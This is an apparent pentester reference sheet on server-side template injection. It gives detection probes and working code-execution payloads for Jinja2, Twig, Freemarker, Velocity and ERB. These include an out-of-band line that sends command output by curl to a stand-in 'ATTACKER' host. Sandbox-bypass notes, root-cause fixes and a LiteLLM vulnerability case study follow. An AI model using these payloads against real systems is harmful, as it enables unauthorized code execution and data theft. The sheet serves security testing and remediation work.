# Server-Side Template Injection (SSTI)

**CWE-1336** | High/Critical | Often leads directly to RCE

## Detection Flow

```
Step 1: Math probe (non-destructive)
  {{7*7}}   → 49    ← Jinja2/Twig/Pebble
  ${7*7}    → 49    ← Freemarker/Velocity
  #{7*7}    → 49    ← Thymeleaf
  *{7*7}    → 49    ← Thymeleaf (selection)
  <%= 7*7 %>→ 49    ← ERB (Ruby)
  {{7*'7'}} → 7777777  ← Jinja2 specifically
             → 49      ← Twig specifically

Step 2: Confirm engine
  {{''.__class__}}  → <class 'str'>  ← Jinja2 confirmed

Step 3: Escalate to RCE (see below)
```

---

## Jinja2 RCE Payloads

### Via `catch_warnings` (stable, works across Python versions)
```python
{% set ns = namespace(cls=none) %}
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}{% set ns.cls = c %}{% endif %}
{% endfor %}
{{ ns.cls.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```
Why `catch_warnings`: universally present in CPython, no hardcoded index needed.

### Via `Popen` direct
```python
{% set ns = namespace() %}
{% set subclasses = ''.__class__.__mro__[1].__subclasses__() %}
{% for c in subclasses %}{% if c.__name__ == 'Popen' %}
{% set ns.proc = c(['id'], stdout=-1) %}{% endif %}{% endfor %}
{{ ns.proc.communicate()[0] }}
```

### Short payloads
```python
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate() }}
# X = index of subprocess.Popen — varies by environment, brute-force needed

{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### OOB exfiltration (when output not reflected)
```python
{{ ns.cls.__init__.__globals__['__builtins__']['__import__']('os')
   .popen('curl "http://ATTACKER/?x=$(id|base64)"').read() }}
```

---

## Twig RCE (PHP)
```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

## Freemarker RCE (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Velocity RCE (Java)
```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

## ERB RCE (Ruby)
```ruby
<%= `id` %>
<%= system("id") %>
```

---

## Common Root Causes

```python
# Python / Jinja2 — VULNERABLE
from jinja2 import Environment
env = Environment()                    # no sandbox
env.from_string(user_input).render()   # user controls template

# Python / Jinja2 — FIXED
from jinja2.sandbox import ImmutableSandboxedEnvironment
env = ImmutableSandboxedEnvironment()

# Note: autoescape=True does NOT prevent SSTI
# It only HTML-encodes OUTPUT — template code still executes first
```

```javascript
// Node.js / Pug — VULNERABLE
pug.render(req.body.template);

// Node.js / Handlebars — VULNERABLE
Handlebars.compile(req.body.template)({});
```

---

## autoescape ≠ SSTI Protection

Common misconception: `autoescape=True` prevents SSTI.
**Wrong.** autoescape HTML-encodes the rendered output.
Template expressions like `{{7*7}}` execute BEFORE any output encoding occurs.

---

## Entry Points to Look For

```
# HTTP parameters fed into templates
POST /prompts/test          dotprompt_content
POST /completions           chat_template / system prompt
GET /render?template=       direct template param
Profile fields              name, bio → rendered in email templates
Admin panels                custom report templates
Webhook payloads            message templates with variable substitution
```

---

## Sandbox Escape (when SandboxedEnvironment is used)

Jinja2's sandbox is not bulletproof. Known bypasses:
```python
# Via format string
{{ ''.__class__.__mro__[1].__subclasses__() }}
# In sandboxed env — most attribute access is blocked
# But check: is it ImmutableSandboxedEnvironment or just SandboxedEnvironment?
# SandboxedEnvironment allows mutation; ImmutableSandboxedEnvironment does not

# Format string bypass (older Jinja2)
{{ "%s"|format(''.__class__) }}
```

---

## LiteLLM Case Study (our finding)

- **File**: `litellm/integrations/dotprompt/prompt_manager.py:62`
- **Endpoint**: `POST /prompts/test`
- **Auth**: Any valid API key (no admin)
- **CVSS**: 9.9 Critical
- **Fix**: Replace `Environment` with `ImmutableSandboxedEnvironment`
- **Same pattern in**: gitlab_prompt_manager.py:93, arize_phoenix_prompt_manager.py:77, bitbucket_prompt_manager.py:77
- **Irony**: `ImmutableSandboxedEnvironment` already used correctly in `litellm_core_utils/prompt_templates/factory.py:11`
- **Huntr report**: https://huntr.com/bounties/2328178c-6ad1-46c5-b9d5-8d22cd9e1880

---

## Checklist for AI/ML Targets

- [ ] Does the app use Jinja2 / Twig / Mako / Freemarker?
- [ ] Is it `Environment()` or `SandboxedEnvironment()`?
- [ ] Is user input passed to `from_string()` or `render_template_string()`?
- [ ] Are prompt templates user-editable?
- [ ] Does the app render LLM output back through a template engine?
- [ ] Is `autoescape` the only "protection"?
